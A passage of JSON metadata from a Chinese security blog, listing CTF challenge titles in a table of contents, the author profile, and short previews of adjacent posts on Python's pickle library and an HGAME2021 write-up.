href=\"#BJDCTF2020-EasySearch\"><span class=\"toc-text\">[BJDCTF2020]EasySearch</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF-2nd-xss%E4%B9%8B%E5%85%89\"><span class=\"toc-text\">[BJDCTF 2nd]xss之光</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun\"><span class=\"toc-text\">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GYCTF2020-FlaskApp\"><span class=\"toc-text\">[GYCTF2020]FlaskApp</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Python之pickle库学习","uid":"c480346b91894d7a42d60e2db7bccc10","slug":"Python之pickle库学习","date":"2021-02-03T01:23:23.000Z","updated":"2021-04-21T16:01:10.291Z","comments":true,"path":"api/articles/Python之pickle库学习.json","keywords":"A1andNS","cover":[],"text":"前言以下内容主要是基于Python3的，Python2环境下序列化的用法和以下类似，但是序列化生成的结果与Python3环境下是不同的。Python 2的pickle内容从实例三开始。 什么是pickle库 Python标准库，只支持python的基本数据类型。 可以处理复杂的序...","link":"","photos":[],"count_time":{"symbolsCount":"5.6k","symbolsTime":"5 mins."},"categories":[{"name":"Python学习","slug":"Python学习","count":19,"path":"api/categories/Python学习.json"}],"tags":[{"name":"Python","slug":"Python","count":23,"path":"api/tags/Python.json"},{"name":"pickle","slug":"pickle","count":1,"path":"api/tags/pickle.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"HGAME2021部分","uid":"c9ebdc7b707001d9ef85b7974ab1c1e5","slug":"HGAME2021","date":"2021-01-31T13:25:26.000Z","updated":"2021-03-29T08:46:31.488Z","comments":true,"path":"api/articles/HGAME2021.json","keywords":"A1andNS","cover":null,"text":"WEBHitchhiking_in_the_Galaxy考点：HTTP头部信息 访问HitchhikerGuide.php，修改访问模式为POST，修改UA为Infinite Improbability Drive，修改Referer为https://cardinal.ink/，...","link":"","photos":[],"count_time":{"symbolsCount":"18k","symbolsTime":"16 mins."},"categories":[{"name":"CTF","slug":"CTF","count":41,"path":"api/categories/CTF.json"}],"tags":[{"name":"HGAME 2021","slug":"HGAME-2021","count":1,"path":"api/tags/HGAME-2021.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}